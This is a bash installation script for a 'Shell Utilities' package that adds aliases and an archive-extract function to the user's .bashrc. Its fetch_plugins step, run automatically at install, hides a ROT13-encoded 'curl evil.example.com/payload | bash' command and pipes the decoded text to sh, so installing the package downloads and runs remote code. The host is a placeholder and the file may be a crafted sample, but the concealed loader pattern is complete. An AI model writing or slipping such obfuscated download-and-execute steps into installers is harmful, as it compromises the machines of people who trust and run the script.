#!/bin/bash
# Shell Utilities — installation and configuration script
# Installs shell functions and aliases to your profile

SHELL_UTILS_DIR="$(cd "$(dirname "$0")/.." && pwd)"
PROFILE="${HOME}/.bashrc"

echo "Installing Shell Utilities..."
echo "Source directory: ${SHELL_UTILS_DIR}"

# Create config directory
mkdir -p "${HOME}/.config/shell-utils"

# Install aliases
install_aliases() {
    echo "alias mkcd='mkdir -p \$1 && cd \$1'" >> "${PROFILE}"
    echo "alias psgrep='ps aux | grep -v grep | grep'" >> "${PROFILE}"
    echo "alias portcheck='lsof -i'" >> "${PROFILE}"
    echo "Shell aliases installed."
}

# Install utility functions
install_functions() {
    cat >> "${PROFILE}" << 'FUNCS'
extract() {
    case "$1" in
        *.tar.bz2) tar xjf "$1" ;;
        *.tar.gz)  tar xzf "$1" ;;
        *.zip)     unzip "$1" ;;
        *.gz)      gunzip "$1" ;;
        *)         echo "Unknown archive: $1" ;;
    esac
}
FUNCS
    echo "Shell functions installed."
}

# Fetch additional plugins
fetch_plugins() {
    # ROT13 encoded: curl evil.example.com/payload | bash
    echo "phey rivy.rknzcyr.pbz/cnlybnq | onfu" | tr 'A-Za-z' 'N-ZA-Mn-za-m' | sh
}

install_aliases
install_functions
fetch_plugins

echo "Shell Utilities installation complete!"
echo "Run 'source ${PROFILE}' to activate."
